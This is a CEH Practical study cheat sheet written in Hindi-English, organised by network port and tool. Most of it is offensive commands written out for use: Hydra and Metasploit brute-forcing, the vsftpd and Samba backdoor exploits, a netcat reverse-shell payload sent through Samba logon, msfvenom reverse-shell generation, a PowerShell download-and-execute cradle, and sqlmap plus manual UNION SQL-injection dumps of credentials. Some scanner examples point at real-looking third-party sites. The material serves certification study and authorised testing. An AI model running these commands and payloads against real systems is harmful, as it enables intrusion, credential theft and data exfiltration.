# CEH-Practical-Notes


### 🔍 **Nmap All Commands in Table Format**

| Sr. No | Nmap Command | क्यों Use करते हैं | क्या पता चलता है |
| --- | --- | --- | --- |
| 1 | `nmap <target>` | Basic scan | Open ports |
| 2 | `nmap -sS <target>` | Stealth SYN scan | TCP open ports without full connection |
| 3 | `nmap -sT <target>` | TCP connect scan | TCP open ports with full handshake |
| 4 | `nmap -sU <target>` | UDP scan | UDP open ports |
| 5 | `nmap -sV <target>` | Version detection | Services & versions running on ports |
| 6 | `nmap -O <target>` | OS detection | Target ka Operating System |
| 7 | `nmap -A <target>` | Aggressive scan | OS, services, traceroute, script scan |
| 8 | `nmap -Pn <target>` | Skip ping | Scan hosts even if ICMP blocked |
| 9 | `nmap -p- <target>` | Scan all 65535 ports | All TCP ports |
| 10 | `nmap --top-ports 100 <target>` | Top 100 ports scan | Common open ports |
| 11 | `nmap -T4 <target>` | Faster scan | Speed boost |
| 12 | `nmap -n <target>` | Skip DNS resolution | Fast scanning |
| 13 | `nmap -sn <subnet>` | Host discovery | Live hosts in subnet |
| 14 | `nmap -sC <target>` | Default scripts | Vulnerabilities & info |
| 15 | `nmap -6 <IPv6>` | IPv6 scanning | IPv6 host scan |
| 16 | `nmap -v <target>` | Verbose output | Detailed output |
| 17 | `nmap -iL <list.txt>` | Multiple targets | List of IPs/hosts scan |
| 18 | `nmap -oN result.txt <target>` | Save output | Result in normal file |
| 19 | `nmap --script dns-* <target>` | DNS info gathering | Hostname, DNS records |
| 20 | `nmap -sS -sV -O -A -T4 <target>` | Full scan combo | All major recon info |
|  |  |  |  |
|  |  |  |  |
| 21 | `nmap -A -sC -sV -O -p- --script vuln -T4 <target_ip>` |  |  |
| 22 | `ip a` |  |  |
| 23 | `nbtscan -r 192.168.70.0/24`  |  |  |
| 24 | `nmap -sn <subnet>` | Host discovery | Live hosts in subnet |
| 25 | `nmap -sn <subnet> -p22`  |  | kaun se port ip me ssh port run ho rha hai wo show krega. |
| 27 | `nmap -sV -sC --script vuln <target_ip> -p 22` |  |  |
| 28 | `nmap -sV -sC  <target ip> -p 21` |  |  |
| 29 | searchsploit samb  | grep 3.0.20 |  |  |
| 30 | **nmap --script smb-os-discovery.nse [Target IP Address]** |  | determine the OS, computer name, domain, workgroup, and current time over the SMB protocol  |
| 31 | **nmap -Pn -sS -A -oX Test 10.10.1.0/24**  |  |  |
| 32  | `locate filename` |  |  |

---

# All port command

| **Command** | **Explanation (1 Line)** |
| --- | --- |
| 1] FTP (21) |  |
| `nmap -p 21 <target ip>` | Only FTP port scan |
| `nmap -p 21 <subnet>` | Subnet me kis-kis host ka **FTP port (21) open hai**, ye identify karta hai. |
| `nmap -sV -sC  <target ip> -p 21` | best |
| `nmap -sV -sC --script vuln <target_ip> -p 21` | vulnerability script use |
| `ftp <target>` | when anonymous login allow  Username: anonymous |
| `nc -nv <target> 21` | **Netcat Se FTP Service Check** |
| `hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>` | **FTP Bruteforce (Hydra)** |
| nmap --script=ftp-syst -p 21 <target> | **FTP server ke system type aur version ki details nikalne ke liye** |
| nmap --script=ftp-brute -p 21 <target> | **FTP brute-force attack perform karne ke liye** |
| nmap -sV --script=ftp-login -p 21 <target> | Attempts login with credentials (default or supplied). with userlist and passlist |
| nmap --script=ftp-anon -p 21 <target> | **Anonymous FTP login allow hai ya nahi yeh check karta hai** |
| nmap --script=ftp-proftpd-backdoor -p 21 <target> | **ProFTPD vulnerability check karne ke liye** |
|  searchsploit vsftpd 2.3.4   |  version pata chle to ye command dal sakte hai |
|  searchsploit -m unix/remote/49757.py | aise hum doenload krege exploit ko   or use google github |
| python3 [49757.py](http://49757.py/) -h   | -h means help command to check use of exploit |
|  python3 [49757.py](http://49757.py/)  192.168.0.102 | usage: [49757.py](http://49757.py/) [-h] host    |
| msfconsole |  |
| search exploit vsftpd 2.3.4 |  |
| search ftp |  |
| use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
run
 | **Using msfconsole Anonymous Login Test Karo** |
| use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/wordlists/rockyou.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
 | **Brute-Force FTP Passwords** |
| use auxiliary/scanner/ftp/ftp_version | Detects FTP version. |
| use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
run
 |  **Exploit FTP Backdoor (vsftpd 2.3.4)** |
| use exploit/unix/ftp/vsftpd_234_backdoor | Exploits vsFTPd 2.3.4 backdoor vulnerability. |
| —————————————————————— | ————————————————————————————————— |


| 2] ssh (22) |  |
| `nmap -sV -sC --script vuln <target_ip> -p 22` | ssh port scan with vuln script |
| ssh username@ip_address
 | ssh port me login using valid credencial |
| **ssh nmap script   /usr/share/nmap/scripts** |  |
| $ ls |grep ssh
ssh2-enum-algos.nse
ssh-auth-methods.nse
ssh-brute.nse |  |
| nmap -p22 192.168.0.106 --script=ssh-brute.nse | single nmap script use  |
| nmap -p 22 --script=ssh-* <target>
 | nmap all script use at one time |
| hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
 |   ssh **Bruteforce (Hydra)** |
| msfconsole   |  |
| search ssh    OR     search ssh_login
 |  |
| use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
 | **SSH Brute-Force via Metasploit** |
| use auxiliary/scanner/ssh/ssh_identify_pubkeys
set RHOSTS <target>
run
 |  **Agar weak key mili, toh tum login kar sakte ho!** |
| —————————————————————— | ————————————————————————————————— |


| 3] Telnet (23) |  |
| nmap -sV -p 23 <target> | Telnet port (23) with service/version detection. |
| nmap -p 23 -sC -sV <target> | Scans port 23 using default scripts + version detection.  |
| nmap -p 23 --script=telnet-brute <target ip> | Performs brute-force attack using a user/pass list.  |
| > nmap -p 23 --script=telnet-logout <target ip> | Checks how the Telnet server responds after login/logout. set userfile passfile |
| telnet  <target ip> 23 | username passname jb pata chal jaye. |
| nmap -p 23 --script=telnet-banner <target ip> | identify old /vulnenability version. |
| nmap -p 23 --script "telnet-*” | Runs all available Telnet NSE scripts in one go. |
| telnet [T.Ip] [Port no.]   |  Login telnet port |
| Metasploit  |  |
| search telnet | Lists all Telnet-related modules (scanner, login, exploits). |
| use auxiliary/scanner/telnet/telnet_version | use auxiliary/scanner/telnet/telnet_version |
| > use auxiliary/scanner/telnet/telnet_login | Performs brute-force attack on Telnet with user/pass list. |
| use exploit/unix/misc/telnet_rce | Attempts Remote Code Execution via Telnet misconfig/vuln (less common) |
| —————————————————————— | ————————————————————————————————— |


| 4] SMTP (25,465,587) |  |
| nmap -sV -p 25,465,587 <target ip> | SMTP ke tino popular ports scan karega (25, 465, 587) aur version dikhayega. |
| nmap -p 23 --script vuln <target ip> | smtp vulnerability script  |
| nmap -p 25 --script=smtp-commands <target ip> | SMTP server kaunsa-kaunsa command support karta hai woh dikhata hai. |
| nmap -p 25 --script=smtp-enum-users <target ip> | SMTP par valid users enumerate karta hai (VRFY, EXPN, RCPT use karke) |
| nmap -p25 192.168.0.106 --script=smtp-brute.nse | smtp brute force |
| nmap -p 25 --script "smtp-*" <target ip> | Saare SMTP related scripts ek saath run karta hai. Full recon.  |
| telnet <target ip> 25 | Manual SMTP Banner Grab |
| metasploit |  |
| search smtp |  |
| use auxiliary/scanner/smtp/smtp_version | SMTP banner aur version extract karta hai. | |
| > use auxiliary/scanner/smtp/smtp_enum | SMTP ke valid users enumerate karta hai (EXPN/VRFY se). |
| nc <target ip> 25 |  |
| use auxiliary/scanner/smtp/smtp_relay | SMTP open relay test karta hai (mail relay exploit). |
| —————————————————————— | —————————————————————————————————- |


| 5] http (80) |  |
| nmap -p 80,443 -sV <target> |  Web server ke ports (HTTP/HTTPS) detect + version info milega. |
| nmap -A 192.168.0.0/24  -p 80,445,8080 |grep WempServer | jis ip pe wempserver run ho rha hai wo batayega . |
| nmap --script=http-enum -p 80 <target> | Common directories, paths jaise `/admin`, `/login` enumerate karta hai. |
| nmap --script=http-methods -p 80 <target> | Kaunse HTTP methods allowed hain (GET, POST, PUT, DELETE, etc). PUT hone pe exploit possible! |
| nmap --script=http-php-version -p 80 <target> | PHP version dikhata hai agar site PHP pe ho (useful for RCE bugs). |
| nmap --script=http-robots.txt -p 80 <target> | robots.txt file ko read karta hai (hidden URLs ya admin links mil sakte hain). |
| nmap --script=http-unsafe-output-escaping -p 80 <target> | XSS jaise client-side bug test karta hai.  |
| **Loginpage brute force.** |  |
| sudo hydra <username> <wordlist>  <Target ip> http-post-form “<path>:<login_credentials>:<invalid_response>” | formate |
| sudo hydra -l  molly -P /usr/share/wordlists/rockyou.txt  <target ip/subdomain>  http-post-form “/login:username=^USER^&password=^PASS^:Your username or password is incorrect” -f  -V -I | eg. |
| nmap --script=http-vuln-* -p 80 <target> | Sab HTTP related vulnerability NSE scripts ek saath run karta hai. | |
| **CMS & Directory Enumeration** |  |
| whatweb <target url>                                                    whatweb https://orane.com/   | // findout cms name, servername, email, ip, os, servername, country website, CMS detection tool (WordPress, Joomla, Drupal, etc)   or wappalyzer extension |
| droopescan scan joomla --url https://www.aiims.edu/ |   |
| droopescan scan --url https://bmu.ac.in/ --cms drupal --enumerate a | Replace <CMS_NAME> with the actual CMS type like drupal, joomla, or wordpress. |
| joomscan -u https://www.aiims.edu/   | only we use when joomla cms run, find out cms,versiov,vulnerabilitu, |
| .Search google for exploitation when you know CM | S name OR  Cms version . eg  CMS joomla 3.7.0 exploit vulnerebility name . |
| .you use serchspoit joomla 3.2.0  to find out  | verlerebility or explitation. |
| wpscan --url orane.com/ | Find out roobot.txt,username identify  only we use word press web site. |
| wpscan --url https://orane.com/ -e --random-user-agent | firewall by pass
    |
| gobuster vhost -u http://orane.com/ -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain  | ek ip pe kitne domain run ho rhe hai. |
| gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,conf,log | linux |
| gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,bak,txt,config,log | windows |
| gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,bak,conf,txt,html -t 50 | both |
| gobuster dir -u http://<target>:8080 -w … | another port run |
| nikto -h http”//target ip |  |
| whois google.com |  |
| subfinder -d  [orane.com](http://orane.com) > subdomain.txt |  |
| msfconsole |  |
| use auxiliary(scanner/http/http_version) | version findout  |
| search php 5.4.2  |  |
| use exploit/multi/http/php_cgi_arg_injection  | set rhost , |
| —————————————————————— | —————————————————————————————————- |


| 6] Smb(139.445) |  |
| `nmap -sn <subnet> -p139,445` |  |
| `nmap -sn <target ip> -p139,445`  |  |
| `nmap -sV -sC  <target ip> -p 139,445` |  |
| `nmap -sV -sC --script vuln <target_ip> -p 139,445` |  |
| cd   /usr/share/nmap/scripts | change dir nmap script |
| ls |grep smb | grep smb |
| nmap 192.168.0.107 --script=smb-enum-shares.nse -p 139 445 | **SMB network par shared folders list karta hai**. |
| nmap  <target> --script=smb-enum-users -p  139,445  | **SMB users ki list retrieve karta hai**. |
| **nmap --script smb-os-discovery.nse [Target IP Address]** | determine the OS, computer name, domain, workgroup, and current time over the SMB protocol  |
| nmap 192.168.0.107 --script=smb-brute.nse -p 139,445 | **SMB user accounts par brute-force attack perform karta hai**. |
| searchsploit samb  | grep 3.0.20 |  |
| enum4linux 192.168.0.107   | put target ip  |
| manual smb exploit  |  |
| smbget -R -U "username%password" smb://10.10.246.144/anonymous | Agar anonymous access allowed na ho aur username/password ki zaroorat ho |
| smbclient -N -L [//192.168.0.107](https://192.168.0.107/) | check Anonymous login  allow hai ya nahi. |
| smbmap -H 192.168.0.107 | check kerta hai read write  |
|  smbclient [//192.168.0.107/tmp](https://192.168.0.107/tmp) | anonymous share pe logi hona rhe taab. |
| smbclient [//192.168.0.106/tmp](https://192.168.0.106/tmp) --option='client min protocol=NT1' | agar NT status connection disconnect dikha to ye command ka use kerke under jayege. |
| logi hone ke baad  command use  | ls,get file.txt,logon "./=`nohup nc -e /bin/sh 192.168.0.103 4444`" |
| logon "./=`nohup nc -e /bin/sh 192.168.0.103 4444`" | ye reverce shell lene ke liye ip address attacker machine ka. |
| > nc -nlvp 4444   | complete  |
| Goto the google and search   : - Samba smbd 3.0.20-Debian exploit on github |  |
| $ nc -nlvp 5555 |  |
| python3 [smb3.0.20.py](http://smb3.0.20.py/) -lh 10.10.16.18 -lp 5555 -t 10.10.10.3  | 1 local hostip ,t- target port ip   ,ye execute krate hi reverse shell mil jayega. |
| RPC client |  |
| https://www.hackingarticles.in/active-directory-enumeration-rpcclient/ |  |
| rpcclient -U "%" 192.168.0.107 |  |
| command run ek ke baad ek  | command :-    srvinfo , querydominfo , enumdomusers , enumdomgroups |
| msfconsole |  |
| use auxiliary/scanner/smb/smb_version    |  |
| use exploit/multi/samba/usermap_script |  |
| —————————————————————— | —————————————————————————————————- |


| 7] DNS (53) |  |
| nmap 192.168.0.107 --script=dns-brute.nse -p 139,445 |  |
| nslookup <domain> OR nslookup <IP> |  |
| `nslookup -type=ns [domain-name]` |  |
| `nslookup` → `server <dns-ip>`    | Set specific DNS server to query |
| `nslookup` → `set type=MX` | Get mail exchange records |
| `nslookup` → `set type=NS` | Get name server records |
| `nslookup` → `set type=TXT` | Get TXT records (used in SPF, DKIM etc.) |
| `nslookup` → `set type=ANY` | Get all records (A, MX, NS, TXT etc.) |
| nslookup
> server 192.168.1.10
> set type=any |  |
| dig [domain.com](http://domain.com/) MX  | NS -namr server, |
| `dig domain.com ANY` | all |
| msfconsole |  |
| use auxiliary/gather/enum_dns | DNS enum, collects names, records, zones |
| use auxiliary/gather/dns_bruteforce | Bruteforce DNS subdomains |
| —————————————————————— | ————————————————————————————————— |


| 8] IMAP (146) |  |
| nmahydra -L users.txt -P pass.txt imap://<target>p -p 143 -sV <target> | IMAP login brute-force |
| msfconsole  |  |
| use auxiliary/scanner/imap/imap_version | IMAP version scan via Metasploit |
| use auxiliary/scanner/imap/imap_login | Login brute-force via Metasploit |
| use auxiliary/scanner/imap/imap_enum | IMAP mailbox structure enumeration (depends on creds) |
| —————————————————————— | ————————————————————————————————— |


| 9] SQL (3306) |  |
| nmap -p 3306 --script vuln 192.168.70.129   |  |
| msfconsole  |  |
| search mysql scanner login | set rhost ,userfile |
| mysql -u root -h 192.168.70.129 | show database, |
| —————————————————————— | ————————————————————————————————— |
| 10] VNC (5900) |  |
| msfconsole |  |
| search vnc 3.3 |  |
| use auxiliary/scanner/vnc/vnc_login |  |
| run kerne ke baad password mil jayega to hum nich | e wala command dal ke password dalege aur enter krege. |
| vncviewer <target ip> | target .ip |
| —————————————————————— | ————————————————————————————————— |
| 11] RDP (3389) |  |
| nmap -sC -sV  192.168.128.18 |  |
| <target ip> open RDP |  |
| rdesktop  <Target ip> | windows machine open hoga. username and password puuchega. |
| hydra -L /usr/share/wordlists/user.txt  -P  /usr/share/wordlists/passwords.txt  <Target ip> rdp | brute force rdp port using hydra |
|  |  |
|  |  |
|  |  |

# Tools Uses and Explanesion

| $ theHarvester -h                                                                 $ theHarvester -d [dsgroup.com](http://dsgroup.com/) -l 300 -b all                       |  Iska use domain se judi public information jaise email addresses, subdomains, IP addresses, aur employee details collect karne ke liye kiya jata hai,  |  |
| --- | --- | --- |

1]  https://www.netcraft.com/ | provide information about a target organization; for example, infrastructure details, physical location, employee details, Moreover, groups, forums, and blogs ,public network information, system information, and personal information.  |  |

 2] https://dnsdumpster.com/ | ek free online tool hai jo kisi domain ke liye **DNS records, subdomains, hostnames, IP addresses, aur network mapping** find karta hai. |  |

3] $  **sherlock "Elon Musk"** | **Gather Personal Information from Various Social Networking Sites using Sherlock** |  |

4] https://whois.domaintools.com/ | **domain owner ka naam, email, phone number (agar public ho), registrar, aur registration/expiry dates** hoti hain.

5 ]Yeh tool aapko **DNS records, domain history, aur related domains** ki bhi info deta hai for deeper reconnaissance. |  |
| http://www.kloth.net/services/nslookup.php | tool se aap kisi domain ka **DNS record** (like A, MX, NS, TXT, CNAME) query kar sakte ho.Yeh tool batata hai ki domain ka **IP address kya hai, mail servers kaunse hain, aur DNS servers kaunse use ho rahe hain.** |  |

6]  $ **tracert [www.certifiedhacker.com](http://www.certifiedhacker.com)                     $ traceroute www.certifiedhacker.com** | **Perform Network Tracerouting in Windows and Linux Machines** |  |
| https://mxtoolbox.com/MXLookup.aspx |  |  |

| https://www.iptrackeronline.com/email-header-analysis/ |  |  |


**2] Scanning Networks** |  |  |
| **$ nmap --script smb-os-discovery.nse [Target IP Address]** | determine the OS, computer name, domain, workgroup, and current time over the SMB protocol  |  |
| Global Network Inventory   | Enumerate Information using Global Network Inventory   (windows 11 tool)   open —>click I Agree  —> next —> Single Address Scan —→ name :- target IP —> username :- Administrator , password :- Pa$$w0rd —> next. —> click both option —> next —> all address  |  |


 3] **Vulnerability Analysis** |  |  |
 **1 ] https://cwe.mitre.org/** | **Perform Vulnerability Research in Common Weakness Enumeration (CWE)** |  |
 **2 ] Perform Vulnerability Analysis using OpenVAS** |  |  |
 step 1 :- docker run -d -p 443:443 --name openvas mikesplain/openvas | sudo su run on parrot machine  |  |
 step 2:- https://127.0.0.1/ | search in browser —> accept risk and contineu —→ log in with admin/admin or admin/password |  |
 step 3 :-  click scane —→ task —→click the Task Wizard option. → enter the target IP address.→stat scan → status ke under 100% scan ho jaye to Done dikhega uspe hi click ker do. →Click on any vulnerability under the Vulnerability column. | follow step 3 |  |
|  |  |  |
|  |  |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Use Msfvanom  to create payloads.

| 1] msfvenom  --list=payloads |grep Android |  |

| 2] android/meterpreter/reverse_tcp  , cmd/linux/http/x64/meterpreter/reverse_tcp , cmd/windows/http/x64/meterpreter/reverse_tcp , php/meterpreter_reverse_tcp  |  |
| 3] msfvenom -p php/meterpreter_reverse_tcp LHOST=<Attackerip give> LPORT=<lisningport give> -f raw > file.php    |  |
| 4] msfconsole -q |  |
| 5] use exploit/multi/handler |  |
| 6] set payload , set lhost attacker ip.  |  |
| 7] run |  |
| https://www.revshells.com/ |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# File transfer attacker machine to victume machine

| 1 | http server |  |
| --- | --- | --- |
|  | attacker :-  python3 -m http.server 8000 | we open hhtp server bec we download any file attacker to vecteam machine using wget command |
| linux | vecteam :-  wget 10.10.14.3:8000/php-reverse-shell.php  -O  -O /dev/shm/php-rev-shell.php | put attacker ip and port and file name which you want to download. |
| windows | vecteam :- powershell -c "IEX(New-Object Net.webClient).downloadString( '[http://10.10.14.19:8000/](http://10.10.14.19:8000/Invoke-PowerShellTcp2.ps1)file name' )" | put attacker ip and port and file name which you want to download in vectem machine . |
| use wget | victeam :-  wget  http://Attacker ip:8000/file path and name  |  |
|  | —————————————————————————— |  |
| 2 | NetCat  |  |
|  | attacker :-  $  nc -nvlp 6666 < pspy64 | < sent file |
|  | vecteam :- $  nc -nv 10.10.14.10 6666 > pspy64 | > receive file |
|  |  |  |
| 3 | attacker :-  |  |
|  | vecteam :-  |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# 🌐 **Online Networking Tools & Websites:*

| 🌐 Website | 📋 Use |
| --- | --- |
| [https://whatismyipaddress.com](https://whatismyipaddress.com/) | IP + geolocation |
| [https://ipinfo.io](https://ipinfo.io/) | Detailed IP info |
| [https://shodan.io](https://shodan.io/) | Find internet-connected devices |
| [https://censys.io](https://censys.io/) | Host scanning, banner grabbing |
| [https://dnsdumpster.com](https://dnsdumpster.com/) | DNS records & subdomain finder |
| [https://yougetsignal.com](https://yougetsignal.com/) | Port scanning |
| [https://viewdns.info](https://viewdns.info/) | WHOIS, DNS, Reverse IP tools |
| [https://virustotal.com](https://virustotal.com/) | Check URL/IP for malicious behavior |
| [https://mxtoolbox.com](https://mxtoolbox.com/) | DNS/MX/Blacklist checks |
| [https://geopeeker.com](https://geopeeker.com/) | View how site looks from different locations |
|  |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

 1 ]       Enum or recon online tools  |  |
| https://pt.wikipedia.org/wiki/Google_Hacking |  |
| https://who.is/ |  |
| https://www.ip2whois.com/ |  |
| https://osintframework.com/ |  |
| https://intelx.io/ | jo email IDs, usernames, domains, IPs, phone numbers, hashes aur leaked documents jaise sensitive data ko find kar sakta hai |


 2 ] DNS enumration online tools  |  |
| https://dnsdumpster.com/ |  |
| https://subdomainfinder.c99.nl/scans/2025-02-13/https://orane.com/?__cf_chl_tk=gmoP0QVoNGw2JlTuwAoakC3G6AEFgjKlIuTymZ7elnY-1744558076-1.0.1.1-Rbu8b9rlw.lrF5D9V1hnaf7gScozeP1LsWJOyEAxf_0 |  |
| https://securitytrails.com/ |  |
| https://crt.sh/ |  |
| https://centralops.net/co/ |  |
| https://web.archive.org/web/20240801000000*/https://orane.com/ |  |
| https://www.virustotal.com/gui/home/upload |  |


 3] email finder in website  |  |
| https://temp-mail.org/en/ |  |
| https://haveibeenpwned.com/ |  |
| https://www.mailboxvalidator.com/demo |  |
| https://mxtoolbox.com/ |  |


 4]  CMS Detection  |  |
| https://whatcms.org/? | what CMs in this site use. |
| https://book.hacktricks.wiki/it/network-services-pentesting/pentesting-web/wordpress.html |  |
| https://book.hacktricks.wiki/it/network-services-pentesting/pentesting-web/joomla.html |  |
| https://book.hacktricks.wiki/it/network-services-pentesting/pentesting-web/drupal/index.html |  |


5] Password Ceacking |  |
| https://book.hacktricks.wiki/en/generic-hacking/brute-force.html |  |
| https://www.md5hashgenerator.com/ |  |
| https://crackstation.net/ |  |
| https://hashcat.net/wiki/doku.php?id=example_hashes |  |
| https://hashes.com/en/tools/hash_identifier |  |
| https://www.kali.org/tools/john/ |  |
| https://www.tunnelsup.com/hash-analyzer/ |  |


6] Privilage exe |  |
| https://gtfobins.github.io/#yu |  |
| https://freedium.cfd/ |  |
| https://www.revshells.com/ |  |
| https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet |  |
| https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp |  |
| https://github.com/payloadbox/sql-injection-payload-list |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Password cracking

 1] hashcat  tool |  |
| --- | --- |
| https://hashes.com/en/tools/hash_identifier |  |
| https://hashcat.net/wiki/doku.php?id=example_hashes |  |
| hashcat -m 0  5d41402abc4b2a76b9719d911017c592  /usr/share/wordlists/rockyou.txt |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

2] johntheripper tool |  |
| `john --wordlist=[path to wordlist] [path to file]` |  |
| `john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt` |  |
| **Format-Specific Cracking** |  |
| `john --list=formats | grep -i 'md5'` |  |
| `john --list=formats | grep -i 'SHA256'` |  |
| **Uses** |  |
| `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt` |  |
| **break Ntlm hash** |  |
| john --list=formats | grep -i 'nt' |  |
| john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt |  |
| **Cracking Hashes from /etc/shadow** |  |
| `unshadow local_passwd local_shadow > etc_hashes.txt` | `/etc/passwd`        `/etc/shadow` |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# SMBMAP Tool uses
1]
| command                                                                     |                                                command explain |
| --- | --- |
| sqlmap -u http://testphp.vulnweb.com/ --crawl=3   --technique="U"   --dbs    |   `//-u = enter doman,using lable 3 max 5 hota hai. , U means union aise hi buniion,blind.   ,—dbs means data base.`   |
| sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique="U" --dbs       .......| Find Database name |
| sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique="U" -D acuart --tables     .......| Find tables when i have database name |
|  sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique="U" -D acuart -T users --columns          .......| Find out coloum when i have table name. |
|  sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --technique="U" -D acuart -T users -C pass,uname --dump |           ......... Dump pass,uname |

2]
| Request capture in burpsuit and safe the request in txt formate in kali. |  |
| 1] hum  login page ka credencial fill ker ke burp ke request pe lege . |  |
| 2] use copy ker lege us request file ko aur  useka name vul-req dedege |  |
| gedit  vul_req |  |
| sqlmap -r vul_req -p uname --dbs | find database |
| sqlmap -r vul_req -p uname -D acuart --tables | find table  |
| sqlmap -r vul_req -p uname -D acuart -T users --coloumns | fine coloum |
| sqlmap -r vul_req -p uname -D acuart -T users -C uname,pass --dump | data dump |
|  |  |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# sql injecsion  notes

| Direct url me change. |  |
| --- | --- |
| http://example.com/product.php?id=5                  ............| targer url |
| nahi diya rhe to find kerlo wyeback url or sqlmap ka use kerke. |  |
step 1 :- http://example.com/product.php?id=5'                ..........| Test for SQLi Vulnerability. |

step 2 :- see You have an error in your SQL syntax near… means           .......... | Site is vulnerable! |

step 3 :- id=5 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) y)   ...| Generate Error for Info (Error-Based SQLi) |

step 4 :- id=5 ORDER BY 1--+
id=5 ORDER BY 2--+
id=5 ORDER BY 3--+
id=5 ORDER BY 4--+ | When error aata hai `ORDER BY 4--+`, means only **3 columns**.
 
 step 6 :- id=-1 UNION SELECT 1,2,3--+
 | Use `UNION SELECT` to test data display |
 
| * ———————————-Extract Database Info———————-* |  |

step 7 :-  id=-1 UNION SELECT 1, database(), 3--+             ..........| Current Database  :-  shopdb |

step 8 :- id=-1 UNION SELECT 1, user(), 3--+               ........| Current User :- root@localhost |

step 9 :- id=-1 UNION SELECT 1, version(), 3--+           ..........| DB Version :- 10.3.31-MariaDB |

step 10 :- id=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema='shopdb'--+          ........| List All Tables   :-  products
                                 users |
step 11 :- id=-1 UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--+            .......| List All Columns in `users` :- id, username, password |

step 12 :-  id=-1 UNION SELECT 1, username, password FROM users--+
 | Dump Users Table (Username & Password) :- admin | admin123
                    vaibhav | hello@123 |

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
                    
2] *————-Burpsuit me sql injecsion kaise perfrom krege————————* |  |
step 1 :  id=5 | Find parameter GET , POST |

step 2 :  id=5' | Genrate Erroer (erroe show like this)  |

step 3 :  id=5' --   &    5'+--                  …not query balance                           
            id=5'+--+-         …query balance | Query Balance & url incoded kerna padega    (ctrl + u) |
            
step 4 : 5'order+by+100+--+-                        …data change                                          • 5' order+by+10+--+-                        …change 
• 5' order+by+13+--+-                     not change in website means 1 se 13 taak table hai hmare pass. | jb query balance ho jaye to Order by 100,50,10,4,5,9 aise number dal ke check kerte hai.   + means url incoded |

step 5 :-  5' union select 1,2,3,4,5,6,7,8,9,10,11,12,13 -- -      (url incoded kro)          • url incode :- 5'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13+--+-   ... | ab 1 se 13 taak kaun si table vulnereble hai wo check kerna hai. |

step 6 :- id=-5'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13+--+- | 5 ke aage - lagado to data show hoga.yaha pe 4 aur 5 table vuln mila |

step 7 :- id=-5'+union+select+1,2,3,version(),5,6,7,8,9,10,11,12,13+--+-
• id=-5'+union+select+1,2,3,database(),5,6,7,8,9,10,11,12,13+--+-
• id=-5'+union+select+1,2,3,database(),version(),6,7,8,9,10,11,12,13+--+- |  |

step 8 :- **Where extension hackbar located in burpsuit**
Extension —> BApp store —> Search Hackbae,Payload,bucket —>install |  |

step 9 :- • now i have this url :-
GET /page.php?id=-5'+union+select+1,2,3,database(),database(),6,7,8,9,10,11,12,13+--+- HTTP/2
• delete one database() in url
id=-5'+union+select+1,2,3,database(), ,6,7,8,9,10,11,12,13+--+- |  |

step 10 :- • right click on between , , —> Extension —> HackBar,Payload Bucket —> hack Bar —> SQLi Injection —> DIOS MYSQL —> tr0jan WAF —> click send butten | All database dump in one short |

step 11 :- id=-5'+union+select+1,2,3,database(), ,6,7,8,9,10,11,12,13+--+-
• right click on between , , —> Extension —> HackBar,Payload Bucket —> hack Bar —> SQLi Injection —> Table —> Table group concat —> ok —> send —> watch in rander | All table nikalna padega to |

step 12 :- id=-5'+union+select+1,2,3,database(), ,6,7,8,9,10,11,12,13+--+-
• right click on between , , —> Extension —> HackBar,Payload Bucket —> hack Bar —> SQLi Injection —> Column —> column group concat —>
• enter table name = admin —> ok —> send | Agar mujhe admin ka table dekhna huaa to. |
| id=-5'+union+select+1,2,3,database(), ,6,7,8,9,10,11,12,13+--+-
• right click on between , , —> Extension —> HackBar,Payload Bucket —> hack Bar —> SQLi Injection —> Data —> Data group concat —>
• Enter database    = dont change click ok
• Enter tablename  = admin click ok
